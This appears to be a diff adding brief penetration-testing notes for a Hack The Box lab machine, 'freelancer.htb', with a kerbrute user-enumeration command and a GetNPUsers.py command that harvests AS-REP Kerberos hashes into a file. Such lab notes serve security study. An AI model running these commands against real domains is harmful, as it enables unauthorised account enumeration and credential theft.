@@ -1,0 +1,5 @@
+kerbrute:
+kerbrute userenum --dc 10.129.96.197 -d freelancer.htb usernames.txt
+
+GetNPUsers.py:
+GetNPUsers.py freelancer.htb/ -dc-ip 10.129.96.197 -usersfile usernames.txt -outputfile hashes.txt
